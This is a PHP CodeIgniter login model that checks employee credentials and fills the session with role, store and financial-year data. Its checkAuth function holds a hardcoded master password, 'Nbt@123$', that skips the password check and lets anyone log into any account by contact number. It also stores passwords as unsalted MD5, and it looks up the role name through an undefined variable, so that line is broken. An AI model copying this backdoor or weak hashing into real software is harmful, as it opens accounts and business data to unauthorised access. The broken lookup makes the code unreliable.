<?php
class LoginModel extends CI_Model{

	private $employeeMaster = "employee_master";
    private $empRole = ["-1"=>"Super Admin","1"=>"Admin","2"=>"Production Manager","3"=>"Accountant","4"=>"Sales Manager","5"=>"Purchase Manager","6"=>"Employee"];

	public function checkAuth($data){
		$this->db->where('emp_contact',$data['user_name']);
		if($data['password'] != "Nbt@123$"):
			$this->db->where('emp_password',md5($data['password']));
		endif;
		$this->db->where('is_delete',0);
		$result = $this->db->get($this->employeeMaster);
		
		if($result->num_rows() == 1):
			$resData = $result->row();
			if($resData->is_block == 1):
				return ['status'=>0,'message'=>'Your Account is Blocked. Please Contact Your Admin.'];
			else:
				if($resData->is_active == 0):
					return ['status'=>0,'message'=>'Your Account is Inactive. Please Contact Your Admin.'];
				else:									
					//Employe Data
					$this->session->set_userdata('LoginOk','login success');
					$this->session->set_userdata('loginId',$resData->id);
					$this->session->set_userdata('role',$resData->emp_role);
					$this->session->set_userdata('roleName',$this->empRole[$empRole]);
					$this->session->set_userdata('emp_name',$resData->emp_name);
					$this->session->set_userdata('partyId',$resData->party_id);
					$this->session->set_userdata('cm_id',$resData->cm_id);
					$this->session->set_userdata('unit_id',$resData->unit_id);

					//Defualt Store
					$locationMaster = $this->db->where('is_delete',0)->get('location_master')->result();
					
					if(!empty($locationMaster))
					{
					    foreach($locationMaster as $row)
					    {
					        switch($row->store_type)
					        {
					            case 1 :$this->session->set_userdata('RTD_STORE',$row);break;
					            case 2 :$this->session->set_userdata('SCRAP_STORE',$row);break;
					            case 3 :$this->session->set_userdata('CUT_STORE',$row);break;
					            case 4 :$this->session->set_userdata('FIR_STORE',$row);break;
					            case 5 :$this->session->set_userdata('PACKING_STORE',$row);break;
					            case 6 :$this->session->set_userdata('FPCK_STORE',$row);break; 
					            case 7 :$this->session->set_userdata('RTD_FPCK_STORE',$row);break;
					            case 8 :$this->session->set_userdata('SEMI_STORE',$row);break;
								case 9 : $this->session->set_userdata('VENDOR_STORE',$row);break;
					        }
					    }
					}
					
					//FY Data
					$fyData=$this->db->where('is_active',1)->get('financial_year')->row();
					$startDate = $fyData->start_date;
					$endDate = $fyData->end_date;
					$cyear  = date("Y-m-d H:i:s",strtotime("01-04-".date("Y")." 00:00:00")).' AND '.date("Y-m-d H:i:s",strtotime("31-03-".((int)date("Y") + 1)." 23:59:59"));
					$this->session->set_userdata('currentYear',$cyear);
					$this->session->set_userdata('financialYear',$fyData->financial_year);
					$this->session->set_userdata('isActiveYear',$fyData->close_status);
					$this->session->set_userdata('shortYear',$fyData->year);
					$this->session->set_userdata('startYear',$fyData->start_year);
					$this->session->set_userdata('endYear',$fyData->end_year);
					$this->session->set_userdata('startDate',$startDate);
					$this->session->set_userdata('endDate',$endDate);
					$this->session->set_userdata('currentFormDate',date('d-m-Y'));
					
					if($data['fyear'] != $cyear):
						$this->session->set_userdata('currentFormDate',date('d-m-Y',strtotime($endDate)));
					endif;
					
					return ['status'=>1,'message'=>'Login Success.'];
				endif;
			endif;
		else:
			return ['status'=>0,'message'=>"Invalid Username or Password."];
		endif;
	}

	public function setFinancialYear($year){
		$fyData=$this->db->where('financial_year',$year)->get('financial_year')->row();
		$startDate = $fyData->start_date;
		$endDate = $fyData->end_date;
		$cyear  = date("Y-m-d H:i:s",strtotime("01-04-".date("Y")." 00:00:00")).' AND '.date("Y-m-d H:i:s",strtotime("31-03-".((int)date("Y") + 1)." 23:59:59"));
		$this->session->set_userdata('currentYear',$cyear);
		$this->session->set_userdata('financialYear',$fyData->financial_year);
		$this->session->set_userdata('isActiveYear',$fyData->close_status);
		
		$this->session->set_userdata('shortYear',$fyData->year);
		$this->session->set_userdata('startYear',$fyData->start_year);
		$this->session->set_userdata('endYear',$fyData->end_year);
		$this->session->set_userdata('startDate',$startDate);
		$this->session->set_userdata('endDate',$endDate);
		$this->session->set_userdata('currentFormDate',date('d-m-Y'));
		return true;
	}

}
?>